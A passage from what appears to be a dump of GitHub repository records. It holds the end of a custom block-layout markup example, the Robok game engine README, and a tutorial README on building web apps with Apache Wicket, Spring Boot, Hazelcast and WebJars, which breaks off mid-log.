        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }

        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }

        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }

        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/oak_leaves.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } div #greenshade { size: 100%; background-color: green; opacity: 0.5; click-through: true; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }

        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/oak_log.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }

        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/stone.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/oak_log.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }

        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/grass_block_side.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
    }
}
```
","A rendering library for myself, but you can use it too! I know that because this is a rather difficult scripting language, so message ImproperIssues (Me) on Discord if you need any help!",,2024-04-26T01:02:52Z,2024-06-17T23:47:21Z,2024-06-17T23:26:21Z,6,2,1,94,0,1,12,4,0,NOASSERTION,Java
robok-inc/Robok-Engine,dev,"<div align=""center"">
  <img src=""https://github.com/robok-inc.png"" alt=""RobokEngine Logo"" width=""120"" height=""120""/>
  <h1>🚀 Robok Engine</h1>
  <p>A cutting-edge engine for simplifying Java game development.</p>
  <a href=""https://github.com/robok-inc/Robok-Engine/issues"">
    <img src=""https://m3-markdown-badges.vercel.app/issues/1/2/robok-inc/Robok-Engine"" alt=""Issues"">
  </a>
  <a href=""https://github.com/robok-inc/Robok-Engine/stargazers"">
    <img src=""https://m3-markdown-badges.vercel.app/stars/1/2/robok-inc/Robok-Engine"" alt=""Stars"">
  </a>
</div>

---

## ✨ Features

- **Material Design 3 UI**: Fully developed following Google’s Material Design 3 guidelines for a modern and clean interface.
- **Jetpack Compose**: Robok uses the Jetpack Compose ToolKit for the UI, so this means that the app follows all the Android guidelines.
- **Open Source**: Robok is completely open source. Explore the code, contribute, and see how the engine works from the inside.
- **APK Build**: Easily generate APKs for your game projects to share or publish directly on the Google Play Store.
- **Robok SDK**: Includes a suite of tools to streamline your game development.
- **RBK Layouts**: A custom language for creating GUI (Game UI).

---

## 🛠️ Prerequisites

- Robok is lightweight and can be used by anyone with minimal system requirements.

---

## 🔧 Installation Steps

1. Download the latest release from the [releases page](#).
2. Install the downloaded application.
3. Open Robok, and you're ready to start building your games!

---

## 🚀 Usage

1. Open Robok.
2. Go to **Create Project**.
3. Enter the project name, package name, and version.
4. Wait for the project to be created.
5. Open the files and start programming your game!

---

## 🌍 Contribute to Robok

If you'd like to contribute to Robok, follow these simple guidelines:

- Use descriptive, concise commit messages.
- Avoid long or unnecessary commits.
- Use tags to describe commit actions (e.g., `feat: Use datagui v2 in project`).

For more details, visit the [Contribution Guide](https://github.com/robok-inc/robok-engine/tree/dev/docs/CONTRIBUTION.md).

---

## 🌐 Participate in Translation

Help translate Robok-Engine! Visit [Weblate](https://hosted.weblate.org/engage/robok-engine/) to get involved:

<a href=""https://hosted.weblate.org/engage/robok-engine/"">
    <img src=""https://hosted.weblate.org/widgets/robok-engine/-/multi-auto.svg"" alt=""Translation Status"">
</a>

---

## 📝 TO-DO

- [X] AAPT2 Compiler
- [X] Code Diagnostics
- [X] Code Editor
- [X] Project Creation
- [X] File Tree
- [X] 3D Modeling
- [ ] Classes to simplify development

---

<div align=""center"">
  <img src=""https://ziadoua.github.io/m3-Markdown-Badges/badges/LicenceGPLv3/licencegplv32.svg"" alt=""GPLv3 License"">
</div>
",An engine for creating 3D games. with MD3 Ui and Jetpack Compose.,"3d,engine,gampiot,java,robok,game-engine",2024-04-22T00:02:34Z,2024-09-26T09:23:46Z,,0,9,245,1820,1,6,12,4,5,GPL-3.0,Java
gokselgurluk/TurizmAcente-master,master,,TurizmAcente,,2024-04-24T10:34:54Z,2024-04-24T18:15:25Z,,0,2,0,9,0,0,12,1,0,,Java
devopstraininghub/mindcircuit13,main,"# mindcircuit13 - SAMPLE APP
",mindcircuit-batch13,,2024-04-18T13:23:47Z,2024-09-26T09:57:54Z,,0,3,11,50,0,142,12,1,0,,Java
bitstorm/modern-webdev-wicket,main,"# Modern Web development with Apache Wicket, Spring Boot, Hazelcast and WebJars


When it comes to implement web applications, Java developers usually feel lost with modern web technologies and they might think that nowadays it's not possible to implement robust and maintainable web applications without adopting the standard JavaScript-based development stack. But what if I tell you that Java is a first-class platform also for web development and that you don't need to switch to a different technology?

The following is a list of _howto_ and example projects that show you how to use Apache Wicket and other familiar frameworks and tools from the Java ecosystem (like Hazelcast, Spring Boot, WebJars, Apache Maven, etc...) to build modern and scalable applications without leaving the Java platform.

More in details you will see how to reach the following goals:

- [Producing clean and resurce-friendly URLs](#produce-resource-friendly-urls)
- [Managing CSS and JavaScript resources with WebJars and Maven](#manage-css-and-javascript-libraries-with-webjars-and-maven)
- [Scaling your application with session clustering and caching](#use-spring-boot-and-hazelcast-to-scale-your-application-with-session-clustering-and-caching)
- [Styling your application using SCSS](#style-your-application-with-scss)

> [!NOTE]
> The following examples are based on Wicket 10 and Java 21, although they should work also for Wicket 9 and Java 17

## Produce resource-friendly URLs

#### Page mounting

Wicket already comes with a native solution to generate structured and resource-friendly URLs by mounting pages to a specific path:

```java
mountPage(""/path/to/page"", MountedPage.class);
```

The path used for mounted pages can contain also segments with dynamic values and they are declared using a special syntax:

```java
/*
 In the following example the path used to mount UserPage has a required parameter
 (userId) and an optional one (taxId).

 For example the following path are both valid:
  - ""/user/123/details/ABC1234567""
  - ""/user/123/details""
*/

mountPage(""/user/${userId}/details/#{taxId}"", UserPage.class);
```

For a full description of page mounting see the related [user guide paragraph](https://nightlies.apache.org/wicket/guide/10.x/single.html#_generating_structured_and_clear_urls)


#### Remove page id from URL

By default Wicket uses a _versioning_ system for stateful pages assiging a incremental id to each version of the pages. This id is usually appended as query parameter at the end of the page's URL:

```
www.myhost.net/page-path?1234
```

The purpose of page versioning is to support browser’s back button: when this button is pressed Wicket must respond by rendering the same page instance previously used.
Again, for a full description of this mechanism see the related [user guide paragraph](https://nightlies.apache.org/wicket/guide/10.x/single.html#_page_versioning_and_caching)

Usually having this id at the end of the page URL is not a big deal, but sometimes you might prefer simply hiding it in the final URL.  

```java
public class NoPageIdMapper extends MountedMapper {

    public NoPageIdMapper(String mountPath, Class<? extends IRequestablePage> pageClass) {
        super(mountPath, pageClass);
    }

    @Override
    protected void encodePageComponentInfo(Url url, PageComponentInfo info) {
        //if componentInfo is null we have a page url and we skip page parameters, otherwise we keep them
        if (info.getComponentInfo() != null) {
            super.encodePageComponentInfo(url, info);
        }

    }
}
```
Please note that this mapper will remove version id only for page URLs, so stateful behaviors (like AJAX behaviors) will continue to work as usual.  

Once we created our custom mapper we must use it to mount our pages: 

```java
public void init()
{
	super.init();

	NoPageIdMapper mapper = new NoPageIdMapper(path, pageClass);
	mount(mapper);
}
```

> [!WARNING]
> Keep in mind that by removing the page id from URL you will lost the browser’s back button support.

## Manage CSS and JavaScript libraries with WebJars and Maven

WebJars is a project aimed to provide client-side libraries distributions as Maven dependency. In this way these libraries can be read directly from JAR files as regular dependecies. WebJars comes with numerous Java libraries to easily integrate this framework with the most popular web frameworks, Wicket included.

For example (project _wicket-webjars_) let's say we want to use Bootstrap 5.3.3 in our Wicket application. The first step is to include the following dependecies in our pom.xml:

```xml
<dependency>
    <groupId>de.agilecoders.wicket.webjars</groupId>
    <artifactId>wicket-webjars</artifactId>
    <version>4.0.3</version>
</dependency>

<dependency>
    <groupId>org.webjars.npm</groupId>
    <artifactId>bootstrap</artifactId>
    <version>5.3.3</version>
</dependency>
```

The first dependency is the library that allows to use WebJars with Wicket while the second is the Bootstrap library distributed by WebJars project.
The second configuration step is the initialization of _wicket-webjars_ library with the following simple code line in our application _init()_ method:

```java
public void init()
{
	super.init();

	// init wicket-webjars library
	WicketWebjars.install(this);
}
```

Now we can add Bootstrap to our page as Wicket CssHeaderItem using reference class _WebjarsCssResourceReference_

```java
@Override
public void renderHead(IHeaderResponse response) {
	super.renderHead(response);

	response.render(CssHeaderItem.forReference(
               new WebjarsCssResourceReference(""bootstrap/5.3.3/css/bootstrap.min.css"")));

}
```

The path used with _WebjarsCssResourceReference_ is appendend to _META-INF/resources/webjars/_ to obtain the path to the desired file inside the library jar. See the [official WebJars site](https://www.webjars.org) to have a look at the content of jar libraries.

To automatically use the version of a WebJar library from your pom.xml, we can simply replace the version in path with the _current_ string. When a resource name is resolved this string will be replaced with the most recent available version in classpath: 


```java
@Override
public void renderHead(IHeaderResponse response) {
	super.renderHead(response);

	response.render(CssHeaderItem.forReference(
               new WebjarsCssResourceReference(""bootstrap/current/css/bootstrap.min.css"")));

}
```

It is also possible to use a resource directly from html markup prepending _/webjars/_ to the resource path:

```html
<link rel='stylesheet' href='/webjars/bootstrap/5.3.3/css/bootstrap.min.css'>
```

> [!WARNING]
> If you are using Jetty remember that resource can be used from html only from version 12.

The project can be started with command `mvn jetty:run`. The page can be seen opening your browser at [http://localhost:8080](http://localhost:8080)

## Use Spring Boot and Hazelcast to scale your application with session clustering and caching

Scaling a web application is not a trivial task and it usually involves a lot of work on additional architectural aspects such as caching, services orchestration and replication, etc... Java developers can count on different valuable frameworks that can dramatically help handling those aspects providing a distributed data storage that can be used both as caching service and coordinator between two or more JVM. One of these framework is [Hazelcast](https://hazelcast.com/) which can be used also for web session clustering. 

In this example (project _wicket-hazelcast_) we will see how to use integrate Wicket with Spring Boot and Hazelcast to share and replicate web session among two or more server instances making our application fault tolerant and scalable.

Our application is a Spring Boot-based web application using Apache Wicket. Let's see the required dependecies to our pom.xml:


```xml
<!-- SESSION REPLICATION -->
<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-core</artifactId>
    <version>3.2.2</version>
</dependency>

<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-hazelcast</artifactId>
    <version>3.2.2</version>          
</dependency>

<!-- WICKET SPRING BOOT INTEGRATION -->
<dependency>
  <groupId>com.giffing.wicket.spring.boot.starter</groupId>
  <artifactId>wicket-spring-boot-starter</artifactId>
  <version>4.0.0</version>        
</dependency>

<!-- WICKET HAZELCAST INTEGRATION -->
<dependency>
    <groupId>org.wicketstuff</groupId>
    <artifactId>wicketstuff-datastore-hazelcast</artifactId>
    <version>10.0.0</version>
</dependency>

<!-- SPRING HAZELCAST INTEGRATION (for caching) -->
<dependency>
    <groupId>com.hazelcast</groupId>
    <artifactId>hazelcast-spring</artifactId>
    <version>5.3.6</version>
</dependency>
```

The main dependency is probably the one on [Wicket and Spring Boot integration project](https://github.com/MarcGiffing/wicket-spring-boot) (artifactId _wicket-spring-boot-starter_) which lays the foundation for our application.
The other dependencies are for Hazelcast integration with Spring and Wicket and for web session clustering.

Now let's look at the code starting with the configuration required to create an _HazelcastConfig_ instance for our application. This is basically the code used in the official [Hazelcast tutorial](https://docs.hazelcast.com/tutorials/spring-session-hazelcast)


```java
@Configuration
@EnableHazelcastHttpSession
@EnableCaching
public class HazelcastConfig {

    @SpringSessionHazelcastInstance
    @Bean(destroyMethod = ""shutdown"")
    public HazelcastInstance hazelcastInstance() {
        Config config = new Config();

        JoinConfig join = config.getNetworkConfig().getJoin();
        // enabling multicast for autodiscovery.
        join.getMulticastConfig().setEnabled(true);

        AttributeConfig attributeConfig = new AttributeConfig()
                .setName(HazelcastIndexedSessionRepository.PRINCIPAL_NAME_ATTRIBUTE)
                .setExtractorClassName(PrincipalNameExtractor.class.getName());

        config.getMapConfig(HazelcastIndexedSessionRepository.DEFAULT_SESSION_MAP_NAME)
            .addAttributeConfig(attributeConfig).addIndexConfig(
                new IndexConfig(IndexType.HASH, HazelcastIndexedSessionRepository.PRINCIPAL_NAME_ATTRIBUTE));
        
        // use custom serializer for better performances. This is optional.
        SerializerConfig serializerConfig = new SerializerConfig();
        serializerConfig.setImplementation(new HazelcastSessionSerializer()).setTypeClass(MapSession.class);
        config.getSerializationConfig().addSerializerConfig(serializerConfig);

        return Hazelcast.newHazelcastInstance(config);
    }

    @Bean
    public CacheManager cacheManager(HazelcastInstance hazelcastInstance) {
        return new HazelcastCacheManager(hazelcastInstance);
    }

}
```

In the class above we used two annotation (beside _@Configuration_), one to enable session clustering with Hazelcast (_@EnableHazelcastHttpSession_) and another to enable Spring caching support (_@EnableCaching_) backed by Hazelcast. Spring caching requires to create a bean of type _CacheManager_

> [!NOTE]
> Spring caching is enabled only for illustration purpose as it's not used in the example code. However with a _CacheManager_ bean created, you can use Spring annotations to [cache the results of you services](https://www.baeldung.com/spring-cache-tutorial).

> [!WARNING]
> Please note that for sake of simplicity we enabled multicast for autodiscovery, so Hazelcast will automatically add to the cluster any new application instance visible on our local network. Keep in mind that multicast is usually not suited for production environment where a safer join configuration is usually required. See the [Hazelcast documentation](https://docs.hazelcast.com/hazelcast/5.4/clusters/network-configuration) for more information on network configuration.


As final configuration step we must tell Wicket to store statefull page instances using Hazelcast. This is done inside Application _init()_ method registering a custom _PageManagerProvider_ using class _HazelcastDataStore_ from WicketStuff project. We also use class _SessionQuotaManagingDataStore_ to limit page storing to max 4 instances per session:

```java
@Override
public void init()
{
	super.init();

	// add your configuration here
	HazelcastInstance instance = getApplicationContext().getBean(HazelcastInstance.class);

	setPageManagerProvider(new DefaultPageManagerProvider(this) {
	    @Override
	    protected IPageStore newPersistentStore() {
		HazelcastDataStore hazelcastDataStore = new HazelcastDataStore(getName(), instance);
	
		return new SessionQuotaManagingDataStore(hazelcastDataStore, 4);
	    }
	});
}
```

With all configuration code in place we can start our application with the following command (assuming port 8083 is free on our machine).

```
SERVER_PORT=8083 mvn spring-boot:run
```

Taking a look at our application logs we can see a message from Hazelcast confirming that a new cluster has been created and the application has successfully joined it:

```
2024-06-13 11:39:30.169 [main] INFO  com.hazelcast.core.LifecycleService - [10.3.0.8]:5702 [dev] [5.3.6] [10.3.0.8]:5702 is STARTING
2024-06-13 11:39:32.835 [main] INFO  c.h.internal.cluster.ClusterService - [10.3.0.8]:5702 [dev] [5.3.6] 

Members {size:1, ver:1} [
